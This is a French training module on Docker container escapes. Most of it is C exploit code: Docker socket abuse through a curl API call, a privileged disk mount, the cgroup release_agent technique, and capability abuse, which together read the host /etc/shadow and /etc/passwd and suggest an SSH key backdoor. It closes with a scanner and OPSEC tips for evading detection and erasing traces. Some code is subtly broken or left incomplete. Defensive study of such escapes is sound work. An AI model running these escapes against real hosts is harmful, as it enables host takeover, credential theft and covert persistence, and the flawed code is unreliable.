# Module L33 : Docker Exploitation - Container Escapes et Privilege Escalation

## Objectifs pédagogiques

À la fin de ce module, vous serez capable de :
- Comprendre l'architecture de sécurité des containers Docker
- Identifier les misconfigurations exploitables
- Réaliser des container escapes via différentes techniques
- Exploiter les volumes, sockets et capabilities mal configurés
- Comprendre les défenses et comment les contourner

## Prérequis

- Bases de Docker (images, containers, volumes)
- Connaissance des syscalls Linux
- Module précédent : Kernel Exploitation Basics

## Introduction

### C'est quoi un container ?

**Analogie** :
```
MACHINE VIRTUELLE vs CONTAINER
══════════════════════════════

Machine Virtuelle:
┌─────────────────────────────────────┐
│           Application               │
├─────────────────────────────────────┤
│         Guest OS (Linux)            │  ← OS complet
├─────────────────────────────────────┤
│           Hypervisor                │
├─────────────────────────────────────┤
│          Host OS (Linux)            │
└─────────────────────────────────────┘
   → Isolation forte, mais lourd

Container Docker:
┌─────────────────────────────────────┐
│           Application               │
├─────────────────────────────────────┤
│         Container Runtime           │  ← Pas d'OS complet
├─────────────────────────────────────┤
│          Host OS (Linux)            │
└─────────────────────────────────────┘
   → Léger, mais partage le kernel !

Un container est comme un processus avec des limites:
- Namespaces : Vision isolée du système
- Cgroups : Limites de ressources
- Capabilities : Permissions restreintes
- Seccomp : Filtrage des syscalls
```

### Pourquoi les container escapes sont importants ?

```
SCÉNARIO D'ATTAQUE TYPIQUE
═══════════════════════════

1. Attaquant compromet une application web dans un container
2. Il a un shell dans le container, mais veut l'host
3. Il cherche des misconfigurations:
   - Docker socket monté ?
   - Mode privileged ?
   - Capabilities dangereuses ?
   - Volumes sensibles ?
4. Il exploite et obtient un shell sur l'host
5. Pivot vers d'autres machines / persistence

Container escape = Escalade de privilèges vers l'host
```

## Architecture de sécurité Docker

### Les couches de protection

```
┌─────────────────────────────────────────────────────────────────┐
│                    HOST LINUX                                    │
│                                                                  │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │                   NAMESPACES                                │ │
│  │                                                             │ │
│  │  ┌─────────┐ ┌─────────┐ ┌─────────┐ ┌─────────┐          │ │
│  │  │   PID   │ │   NET   │ │   MNT   │ │   UTS   │ ...      │ │
│  │  └─────────┘ └─────────┘ └─────────┘ └─────────┘          │ │
│  │                                                             │ │
│  │  Chaque container a sa propre vue du système               │ │
│  └────────────────────────────────────────────────────────────┘ │
│                                                                  │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │                    CGROUPS                                  │ │
│  │                                                             │ │
│  │  Limites: CPU, Mémoire, I/O, PIDs                          │ │
│  │  Empêche les DoS et la fuite de ressources                 │ │
│  └────────────────────────────────────────────────────────────┘ │
│                                                                  │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │                 CAPABILITIES                                │ │
│  │                                                             │ │
│  │  Permissions granulaires (pas de root complet)             │ │
│  │  Par défaut: ~14 capabilities, pas CAP_SYS_ADMIN           │ │
│  └────────────────────────────────────────────────────────────┘ │
│                                                                  │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │                   SECCOMP                                   │ │
│  │                                                             │ │
│  │  Filtre ~300 syscalls autorisés (sur ~400 disponibles)     │ │
│  │  Bloque: mount, reboot, kexec, etc.                        │ │
│  └────────────────────────────────────────────────────────────┘ │
│                                                                  │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │                   AppArmor/SELinux                          │ │
│  │                                                             │ │
│  │  Mandatory Access Control                                   │ │
│  │  Profils de sécurité par container                         │ │
│  └────────────────────────────────────────────────────────────┘ │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### Namespaces Linux

| Namespace | Isolation | Impact sécurité |
|-----------|-----------|-----------------|
| **PID** | Process IDs | Container ne voit pas les processus host |
| **NET** | Réseau | Interfaces réseau isolées |
| **MNT** | Points de montage | Filesystem isolé |
| **UTS** | Hostname | Hostname séparé |
| **IPC** | Inter-Process Communication | Shared memory isolée |
| **USER** | User IDs | UID 0 dans container ≠ UID 0 sur host |
| **CGROUP** | Cgroups | Vue isolée des cgroups |

## Technique 1 : Docker Socket Exposure

### Principe

Si le socket Docker (`/var/run/docker.sock`) est monté dans un container, l'attaquant peut contrôler Docker et échapper au container.

```
EXPLOITATION DU DOCKER SOCKET
══════════════════════════════

Container compromis
        │
        ▼
┌───────────────────────────────┐
│  /var/run/docker.sock monté   │
│                               │
│  docker run -v /:/host        │
│    --privileged alpine        │
│    chroot /host sh            │
│                               │
└───────────────────────────────┘
        │
        ▼
    Shell sur l'host !
```

### Détection

```c
#include <stdio.h>
#include <unistd.h>

/**
 * detect_docker_socket - Vérifie si le socket Docker est accessible
 */
int detect_docker_socket(void) {
    const char *socket_paths[] = {
        "/var/run/docker.sock",
        "/run/docker.sock",
        "/.dockerenv"
    };

    printf("[*] Recherche du Docker socket...\n");

    for (int i = 0; i < 3; i++) {
        if (access(socket_paths[i], F_OK) == 0) {
            printf("[!] TROUVÉ: %s\n", socket_paths[i]);

            if (access(socket_paths[i], R_OK | W_OK) == 0) {
                printf("[!] LECTURE+ÉCRITURE possible!\n");
                return 1;
            }
        }
    }

    printf("[-] Docker socket non accessible\n");
    return 0;
}
```

### Exploitation

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>

/**
 * escape_via_docker_socket - Escape via Docker socket
 *
 * Crée un container privileged avec le filesystem host monté,
 * puis exécute une commande sur l'host.
 */
int escape_via_docker_socket(void) {
    printf("[*] Tentative d'escape via Docker socket...\n");

    if (access("/var/run/docker.sock", W_OK) != 0) {
        printf("[-] Docker socket non accessible en écriture\n");
        return -1;
    }

    printf("[+] Docker socket accessible!\n");
    printf("[*] Création d'un container privileged...\n");

    /* Méthode simple via curl */
    const char *cmd =
        "curl -s --unix-socket /var/run/docker.sock "
        "-X POST \"http://localhost/containers/create\" "
        "-H \"Content-Type: application/json\" "
        "-d '{\"Image\":\"alpine\",\"Cmd\":[\"/bin/sh\",\"-c\","
        "\"chroot /host /bin/bash -c \\\"id > /tmp/pwned\\\"\"],"
        "\"HostConfig\":{\"Binds\":[\"/:/host\"],\"Privileged\":true}}' "
        "2>/dev/null";

    printf("[*] Commande: %s\n", cmd);
    printf("[*] En pratique, exécuter:\n");
    printf("    docker -H unix:///var/run/docker.sock run -v /:/host "
           "--privileged alpine chroot /host sh\n");

    return 0;
}
```

## Technique 2 : Privileged Container Escape

### Principe

Un container en mode `--privileged` a presque toutes les capabilities et peut accéder aux devices de l'host.

```
CONTAINER PRIVILEGED
═══════════════════

Capabilities: ALL
Seccomp: DISABLED
AppArmor: DISABLED
Devices: ALL (/dev/*)

→ Équivalent à root sur l'host, juste avec des namespaces
```

### Exploitation via mount

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <fcntl.h>

/**
 * escape_privileged_mount - Escape via mount du disque host
 */
int escape_privileged_mount(void) {
    printf("[*] Tentative d'escape via mount (privileged)...\n");

    /* Vérifier si on peut monter */
    if (mkdir("/mnt/host", 0755) != 0 && errno != EEXIST) {
        printf("[-] Impossible de créer /mnt/host\n");
        return -1;
    }

    /* Lister les disques disponibles */
    printf("[*] Disques disponibles:\n");
    system("ls -la /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null");

    /* Tenter de monter sda1 (disque root typique) */
    if (mount("/dev/sda1", "/mnt/host", "ext4", 0, NULL) == 0) {
        printf("[+] /dev/sda1 monté sur /mnt/host!\n");
        printf("[+] Filesystem host accessible!\n");

        /* Lire /etc/shadow de l'host */
        printf("\n[*] /etc/shadow de l'host:\n");
        system("cat /mnt/host/etc/shadow 2>/dev/null | head -5");

        /* Ajouter une backdoor */
        printf("\n[*] Backdoor SSH possible:\n");
        printf("    echo 'ssh-rsa AAAA...' >> /mnt/host/root/.ssh/authorized_keys\n");

        return 0;
    }

    printf("[-] Mount échoué (pas privileged ou device incorrect)\n");
    return -1;
}
```

### Exploitation via cgroups release_agent

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>

/**
 * escape_cgroup_release_agent - Escape via cgroup release_agent
 *
 * Technique Felix Wilhelm (2019)
 * Fonctionne sur containers privileged avec cgroups v1
 */
int escape_cgroup_release_agent(void) {
    char cgroup_path[256];
    char release_agent[256];
    char cmd_path[256];
    int fd;

    printf("[*] Tentative d'escape via cgroup release_agent...\n");

    /* 1. Créer un cgroup */
    snprintf(cgroup_path, sizeof(cgroup_path),
             "/sys/fs/cgroup/rdma/escape_%d", getpid());

    if (mkdir(cgroup_path, 0755) != 0) {
        printf("[-] Impossible de créer le cgroup\n");
        return -1;
    }

    printf("[+] Cgroup créé: %s\n", cgroup_path);

    /* 2. Activer le release_agent */
    snprintf(release_agent, sizeof(release_agent),
             "/sys/fs/cgroup/rdma/release_agent");

    fd = open(release_agent, O_WRONLY);
    if (fd < 0) {
        printf("[-] Impossible d'ouvrir release_agent\n");
        return -1;
    }

    /* 3. Trouver le chemin host vers notre script */
    char host_path[256];
    FILE *f = fopen("/proc/self/cgroup", "r");
    if (f) {
        char line[512];
        while (fgets(line, sizeof(line), f)) {
            /* Parser pour trouver le chemin */
        }
        fclose(f);
    }

    /* 4. Créer le script de payload */
    snprintf(cmd_path, sizeof(cmd_path), "/cmd");
    FILE *cmd = fopen(cmd_path, "w");
    if (cmd) {
        fprintf(cmd, "#!/bin/sh\n");
        fprintf(cmd, "id > /tmp/escape_proof\n");
        fprintf(cmd, "cat /etc/shadow > /tmp/shadow_dump\n");
        fclose(cmd);
        chmod(cmd_path, 0755);
    }

    /* 5. Déclencher le release_agent */
    char notify_path[256];
    snprintf(notify_path, sizeof(notify_path),
             "%s/notify_on_release", cgroup_path);

    fd = open(notify_path, O_WRONLY);
    if (fd >= 0) {
        write(fd, "1", 1);
        close(fd);
    }

    printf("[*] Release agent configuré\n");
    printf("[*] Pour déclencher: terminer le dernier process du cgroup\n");

    return 0;
}
```

## Technique 3 : Capabilities Abuse

### CAP_SYS_ADMIN

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/mount.h>

/**
 * escape_cap_sys_admin - Escape via CAP_SYS_ADMIN
 *
 * CAP_SYS_ADMIN permet de monter des filesystems
 */
int escape_cap_sys_admin(void) {
    printf("[*] Vérification de CAP_SYS_ADMIN...\n");

    /* Lire les capabilities effectives */
    FILE *f = fopen("/proc/self/status", "r");
    if (!f) return -1;

    char line[256];
    unsigned long long cap_eff = 0;

    while (fgets(line, sizeof(line), f)) {
        if (sscanf(line, "CapEff:\t%llx", &cap_eff) == 1)
            break;
    }
    fclose(f);

    /* CAP_SYS_ADMIN = bit 21 */
    if (!(cap_eff & (1ULL << 21))) {
        printf("[-] CAP_SYS_ADMIN non présente\n");
        return -1;
    }

    printf("[+] CAP_SYS_ADMIN détectée!\n");
    printf("[*] Tentative de mount...\n");

    if (mkdir("/mnt/escape", 0755) == 0 || errno == EEXIST) {
        if (mount("none", "/mnt/escape", "tmpfs", 0, NULL) == 0) {
            printf("[+] Mount réussi! Sandbox potentiellement bypassée\n");
            return 0;
        }
    }

    return -1;
}
```

### CAP_DAC_READ_SEARCH

```c
/**
 * escape_cap_dac_read_search - Lecture de fichiers arbitraires
 *
 * CAP_DAC_READ_SEARCH permet de bypasser les permissions de lecture
 */
int escape_cap_dac_read_search(void) {
    printf("[*] Vérification de CAP_DAC_READ_SEARCH...\n");

    /* Tenter de lire /etc/shadow (normalement inaccessible) */
    int fd = open("/etc/shadow", O_RDONLY);
    if (fd >= 0) {
        printf("[+] CAP_DAC_READ_SEARCH active!\n");
        printf("[+] Lecture de /etc/shadow possible\n");

        char buf[1024];
        ssize_t n = read(fd, buf, sizeof(buf) - 1);
        if (n > 0) {
            buf[n] = '\0';
            printf("%s\n", buf);
        }
        close(fd);
        return 0;
    }

    printf("[-] CAP_DAC_READ_SEARCH non disponible\n");
    return -1;
}
```

## Technique 4 : Volumes Sensibles

### /proc/1/root

```c
/**
 * escape_proc_root - Escape via /proc/1/root
 *
 * Si /proc est monté sans hidepid, on peut accéder au
 * filesystem de PID 1 (init sur l'host)
 */
int escape_proc_root(void) {
    printf("[*] Tentative d'accès via /proc/1/root...\n");

    /* Vérifier l'accès */
    if (access("/proc/1/root", R_OK) != 0) {
        printf("[-] /proc/1/root non accessible\n");
        return -1;
    }

    printf("[+] /proc/1/root accessible!\n");

    /* Lire /etc/passwd de l'host */
    FILE *f = fopen("/proc/1/root/etc/passwd", "r");
    if (f) {
        printf("[+] /etc/passwd de l'host:\n");
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            printf("    %s", line);
        }
        fclose(f);
    }

    return 0;
}
```

## Outil complet : Container Escape Scanner

```c
/**
 * container_escape_scanner.c
 *
 * Outil de scan des vulnérabilités container
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <fcntl.h>
#include <errno.h>

/* Prototypes */
int check_docker_socket(void);
int check_privileged(void);
int check_capabilities(void);
int check_sensitive_mounts(void);
int check_writable_volumes(void);

/**
 * check_docker_socket - Vérifie la présence du Docker socket
 */
int check_docker_socket(void) {
    printf("\n[1] DOCKER SOCKET\n");
    printf("═══════════════════\n");

    if (access("/var/run/docker.sock", F_OK) == 0) {
        printf("[!] /var/run/docker.sock PRÉSENT\n");

        if (access("/var/run/docker.sock", W_OK) == 0) {
            printf("[!] ÉCRITURE POSSIBLE - ESCAPE TRIVIAL!\n");
            printf("[+] Commande: docker -H unix:///var/run/docker.sock "
                   "run -v /:/host --privileged alpine chroot /host\n");
            return 1;
        }
    }

    printf("[✓] Docker socket non exposé\n");
    return 0;
}

/**
 * check_privileged - Vérifie si le container est privileged
 */
int check_privileged(void) {
    printf("\n[2] MODE PRIVILEGED\n");
    printf("═══════════════════\n");

    /* Indicateurs de mode privileged */
    int privileged_indicators = 0;

    /* Test 1: Accès aux devices */
    if (access("/dev/sda", F_OK) == 0) {
        printf("[!] Accès aux block devices (/dev/sda)\n");
        privileged_indicators++;
    }

    /* Test 2: Toutes les capabilities */
    FILE *f = fopen("/proc/self/status", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strncmp(line, "CapEff:", 7) == 0) {
                unsigned long long cap;
                sscanf(line + 8, "%llx", &cap);
                if (cap == 0x3ffffffffff) {
                    printf("[!] TOUTES les capabilities présentes\n");
                    privileged_indicators++;
                }
                break;
            }
        }
        fclose(f);
    }

    /* Test 3: Seccomp désactivé */
    f = fopen("/proc/self/status", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strncmp(line, "Seccomp:", 8) == 0) {
                int seccomp;
                sscanf(line + 9, "%d", &seccomp);
                if (seccomp == 0) {
                    printf("[!] Seccomp DÉSACTIVÉ\n");
                    privileged_indicators++;
                }
                break;
            }
        }
        fclose(f);
    }

    if (privileged_indicators >= 2) {
        printf("[!] Container probablement PRIVILEGED - ESCAPE FACILE!\n");
        return 1;
    }

    printf("[✓] Container non privileged\n");
    return 0;
}

/**
 * check_capabilities - Vérifie les capabilities dangereuses
 */
int check_capabilities(void) {
    printf("\n[3] CAPABILITIES DANGEREUSES\n");
    printf("═══════════════════════════════\n");

    FILE *f = fopen("/proc/self/status", "r");
    if (!f) return 0;

    char line[256];
    unsigned long long cap_eff = 0;

    while (fgets(line, sizeof(line), f)) {
        if (sscanf(line, "CapEff:\t%llx", &cap_eff) == 1)
            break;
    }
    fclose(f);

    int dangerous = 0;

    /* Capabilities dangereuses */
    struct {
        int bit;
        const char *name;
        const char *risk;
    } caps[] = {
        {21, "CAP_SYS_ADMIN", "Mount filesystems, escape possible"},
        {17, "CAP_SYS_PTRACE", "Debug any process, credential theft"},
        {16, "CAP_SYS_MODULE", "Load kernel modules"},
        {12, "CAP_NET_ADMIN", "Network configuration"},
        {2,  "CAP_DAC_READ_SEARCH", "Read any file"},
        {25, "CAP_SYS_RAWIO", "Raw I/O access"},
        {-1, NULL, NULL}
    };

    for (int i = 0; caps[i].name; i++) {
        if (cap_eff & (1ULL << caps[i].bit)) {
            printf("[!] %s présente - %s\n", caps[i].name, caps[i].risk);
            dangerous++;
        }
    }

    if (dangerous == 0) {
        printf("[✓] Pas de capabilities dangereuses\n");
    }

    return dangerous;
}

/**
 * check_sensitive_mounts - Vérifie les montages sensibles
 */
int check_sensitive_mounts(void) {
    printf("\n[4] MONTAGES SENSIBLES\n");
    printf("══════════════════════════\n");

    const char *sensitive[] = {
        "/var/run/docker.sock",
        "/proc/1/root",
        "/sys/fs/cgroup",
        "/dev",
        "/etc/shadow",
        "/etc/passwd",
        "/root/.ssh",
        NULL
    };

    int found = 0;

    for (int i = 0; sensitive[i]; i++) {
        if (access(sensitive[i], F_OK) == 0) {
            struct stat st;
            stat(sensitive[i], &st);

            char perms[16];
            snprintf(perms, sizeof(perms), "%c%c%c",
                     (access(sensitive[i], R_OK) == 0) ? 'r' : '-',
                     (access(sensitive[i], W_OK) == 0) ? 'w' : '-',
                     (access(sensitive[i], X_OK) == 0) ? 'x' : '-');

            printf("[!] %s (%s)\n", sensitive[i], perms);
            found++;
        }
    }

    if (found == 0) {
        printf("[✓] Pas de montages sensibles détectés\n");
    }

    return found;
}

/**
 * main - Point d'entrée
 */
int main(void) {
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════╗\n");
    printf("║         Container Escape Scanner - Module L33                ║\n");
    printf("║                                                               ║\n");
    printf("║   Scan des vulnérabilités d'escape container                 ║\n");
    printf("╚═══════════════════════════════════════════════════════════════╝\n");

    int total_vulns = 0;

    total_vulns += check_docker_socket();
    total_vulns += check_privileged();
    total_vulns += check_capabilities();
    total_vulns += check_sensitive_mounts();

    printf("\n");
    printf("════════════════════════════════════════════════════════════════\n");
    printf("RÉSULTAT: %d vulnérabilité(s) détectée(s)\n", total_vulns);

    if (total_vulns > 0) {
        printf("\n[!] Container potentiellement vulnérable à l'escape!\n");
    } else {
        printf("\n[✓] Container bien configuré (selon ce scan)\n");
    }

    printf("════════════════════════════════════════════════════════════════\n");

    return total_vulns > 0 ? 1 : 0;
}
```

## Application offensive

### Workflow Red Team

```
MÉTHODOLOGIE D'ESCAPE
══════════════════════

1. RECONNAISSANCE
   ├─ Suis-je dans un container ? (/.dockerenv, /proc/1/cgroup)
   ├─ Quel runtime ? (Docker, containerd, CRI-O)
   └─ Version du kernel host ?

2. SCAN DES VULNÉRABILITÉS
   ├─ Docker socket exposé ?
   ├─ Mode privileged ?
   ├─ Capabilities dangereuses ?
   ├─ Volumes sensibles ?
   └─ Misconfigurations cgroups ?

3. EXPLOITATION
   ├─ Prioriser les techniques par fiabilité
   ├─ Docker socket > Privileged > Capabilities
   └─ Tester en commençant par le moins destructif

4. POST-EXPLOITATION
   ├─ Persistence sur l'host
   ├─ Pivot vers autres containers/machines
   └─ Nettoyage des traces
```

### Considérations OPSEC

**Détection possible** :
- Auditd : Logs des mount, ptrace, socket access
- Falco : Rules spécifiques container escape
- Docker logs : API calls suspects
- Network : Connexions depuis container vers host

**Contre-mesures** :
1. Éviter les commandes bruyantes (`docker run`)
2. Utiliser des techniques natives (cgroups vs docker CLI)
3. Nettoyer les traces après escape

## Résumé

- **Docker socket exposure** : Escape trivial si `/var/run/docker.sock` monté
- **Privileged containers** : Accès complet aux devices et capabilities
- **Capabilities abuse** : CAP_SYS_ADMIN, CAP_SYS_PTRACE exploitables
- **Volumes sensibles** : /proc/1/root, /etc/shadow montés
- **Cgroups release_agent** : Technique Felix Wilhelm pour privileged

## Ressources complémentaires

**Recherche** :
- [Understanding Docker Container Escapes](https://blog.trailofbits.com/)
- [Felix Wilhelm - Container Escapes](https://twitter.com/felixwilhelm)
- [HackTricks - Docker Breakout](https://book.hacktricks.xyz/)

**Outils** :
- `deepce` - Docker Enumeration & Escape
- `CDK` - Container penetration toolkit
- `amicontained` - Container introspection tool

---

**Navigation**
- [Module précédent : Kernel Exploitation](../02-Kernel-Exploitation/)
- [Module suivant : Container Persistence](../04-Container-Persistence/)
